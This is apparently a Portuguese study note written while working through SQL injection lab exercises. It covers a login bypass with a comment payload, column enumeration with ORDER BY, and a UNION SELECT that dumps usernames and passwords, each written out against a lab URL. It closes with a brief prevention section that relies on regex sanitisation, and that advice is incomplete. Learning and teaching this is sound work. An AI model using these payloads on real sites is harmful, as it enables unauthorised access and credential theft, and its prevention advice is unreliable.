2025-06-26 14:20

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[SQL Injection]] | [[3 - Tags/Segurança/SQL]] | [[Pentest]]

----
# Introdução

Em 1998, o SQL Injection, foi publicado pela primeira vez em uma espécie de publicação chamada e-zine, escrita por e para hackers, a Phrack, [na #54 edição, volume 8](https://www.phrack.org/issues/54/8#article). Nela, uma pessoa identificada por `rain.forest.puppy` juntamente com um(a) colega de trabalho relataram a descoberta de conseguir inserir comandos SQL em bancos de dados.

Além de falarem  mais sobre como explorar essa vulnerabilidades, também relatavam uma tentativa de alertar a Microsoft sobre essa questão. Contudo, a resposta que obtiveram não foi a esperada pois, na época, a Microsoft considerou que isso não parecia ser um problema.

Mas estavam bastante errados: a partir disso, diversos ataques usando SQL Injection ocorreram, e ainda hoje esse cenário é uma preocupação.

---
# Login Bypass com SQL Injection

Em uma seção de login de uma página é possível acessar como administrador sem mesmo saber a senha, isso é possível graças a vulnerabilidades de SQL Injection.

**Exemplo:**

```sql
Username: administrator' --
Password: (qualquer senha)
```



![[Pasted image 20250626143158.png]]

Desta forma é possível explorar uma query SQL que provavelmente está escrita da seguinte forma:

```sql
SELECT * FROM users WHERE username = 'administrator' --' AND password = '123'
```

Em SQL `--` comenta do o código interno de acesso ao banco de dados, o que possibilita acessar a conta `administrator`, sem ser necessário saber a senha, pois a consulta `password` foi comentada.

---
# Descobrindo a quantidade de colunas

No exemplo é possível notar que o site filtra as categorias através do URL da aplicação.

![[Pasted image 20250626143607.png]]

- Ao final da URL é possível fazer o SQL Injection ao digitar `' ORDER BY 1 --` para ordenar a coluna 1. É possível notar que ao inserir o código SQL na URL não se obteve `Internal Server Error` , o que indica que existe um mínimo de 1 coluno.

**Exemplo:**

```sql
https://ac0b1fd11ee795f5c06a0727000600bf.web-security-academy.net/filter?category=Pets’ ORDER BY 1 --
```

- Agora, ao final da URL ao digitar `’ ORDER BY 2 -–` para ordenar a coluna 2 é possível observar que não será obtido o `Internal Server Error` novamente, o que indica que existe uma segunda coluna.

**Exemplo:**

```sql
https://ac0b1fd11ee795f5c06a0727000600bf.web-security-academy.net/filter?category=Pets’ ORDER BY 2 --
```

- Por fim, ao tentar digitar `' ORDER BY 3 --` para ordenar a coluna 3, será obtido um `Internal Server Error`, oque indica que não existe uma terceira coluna.

**Exemplo:**

```sql
https://ac0b1fd11ee795f5c06a0727000600bf.web-security-academy.net/filter?category=Pets’ ORDER BY 3 --
```

Com isso é possível concluir que existe 2 colunas dentro da tabela de produtos.

---
# Consultando outra tabela

Ao final da URL, ao acrescentar `' UNION SELECT * FROM users --` para unir com o comando `UNION` uma outra consulta a tabela `users`.

**Exemplo:**

```bash
https://ac0b1fd11ee795f5c06a0727000600bf.web-security-academy.net/filter?category=Pets' UNION SELECT * FROM users --
```

- Ao acessar a URL, juntamente com a tabela `Pets`, será listado todos os usuários e senhas, inclusive o usuário `administrator`.

![[Pasted image 20250626144436.png]]

Desta forma é possível explorar a tabela `users` por meio de outra tabela por meio do comando `UNION SELECT`:

```sql
SELECT * FROM products WHERE category = 'Pets' UNION SELECT * FROM users --'
```

Onda já existia o primeiro `SELECT` desenvolvido foi possível adicionar uma segunda busca na `category` , fazendo assim uma segunda consulta por meio do `UNION`. E pelo fato das duas tabelas terem o mesmo número de colunas e o mesmo tipo de dados é possível visualizar o seu conteúdo.

---
# Como se prevenir

Para se prevenir contra ataques de SQL Injection, é necessário **sanitizar** os dados antes de processá-los, ou seja, tratar com cuidado as aspas, caracteres especiais e uma série de outros detalhes. Isso pode ser feito com expressões regulares, mas dificilmente é possível tratar todos os casos possíveis de SQL Injection.